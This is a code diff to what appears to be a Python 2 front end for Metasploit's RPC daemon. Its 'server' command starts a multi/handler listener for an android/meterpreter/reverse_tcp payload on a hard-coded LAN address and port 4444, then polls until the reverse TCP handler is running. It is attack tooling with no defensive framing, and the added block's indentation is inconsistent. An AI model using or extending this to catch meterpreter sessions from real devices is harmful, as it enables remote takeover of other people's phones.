@@ -157,8 +157,26 @@ class Main:
             if command == "quit":
                 self.msfconsole.disconnect()
                 sys.exit()
+            if command == "n":
+                print self.msfconsole.get_response()
+                self.exec_menu('main_menu')
             if command == "server":
-                command = "use exploit/multi/handler\nset payload android/meterpreter/reverse_tcp\nset lhost 192.168.1.128\nset lport 4444\nexploit"
+                command = "use exploit/multi/handler\nset payload android/meterpreter/reverse_tcp\nset lhost 192.168.1.128\nset lport 4444"
+                self.msfconsole.exec_command(command)
+                print self.msfconsole.get_response()
+                self.msfconsole.exec_command("exploit")
+                while True:
+                	if self.msfconsole.get_response().startswith("[*] Started reverse TCP handler on"):
+                		break
+                	print self.msfconsole.get_response()
+                	time.sleep(1)
+                self.msfconsole.disconnect()
+                if self.msfconsole.connect() is False:
+            			sys.exit()
+            		# Add directory auto completion
+        			readline.parse_and_bind("tab: complete")
+					# Go to main menu
+        			self.exec_menu('main_menu')
             # If command not empty send it to msfrpcd
             if command:
                 self.msfconsole.exec_command(command)
